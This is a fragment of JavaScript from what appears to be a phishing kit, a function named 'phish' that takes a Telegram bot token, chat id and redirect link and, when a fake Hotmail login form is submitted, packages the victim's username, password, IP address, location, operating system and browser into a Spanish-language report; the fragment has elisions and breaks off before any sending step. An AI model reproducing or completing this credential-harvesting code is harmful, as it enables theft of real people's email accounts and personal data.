const phish = (bot_token, chat_id, redirect_link) => {
    ...
    submitButton.on('click', function() {
        let currentdate = new Date(),
            ...
            passVal = pass.val(),
            msg = `----------------------------------------------------%0A
Plantilla de Hotmail:%0A%0A
Fecha  :    ${date}%0A
Hora :    ${time}%0A
----------------------------------------------------%0A
Usuario:    ${unameVal}%0A
Contraseña :    ${passVal}%0A
----------------------------------------------------%0A
IP: ${ip_json.query}%0A
Ubicacion: ${ip_json.city}, ${ip_json.regionName}, ${ip_json.country}%0A
Sistema Operativo: ${e.os.name} v${e.os.version}%0A
Navegador:  ${e.browser.name} v${e.browser.version}%0A
----------------------------------------------------%0A%0A
Codigo Encriptado%0A%0A
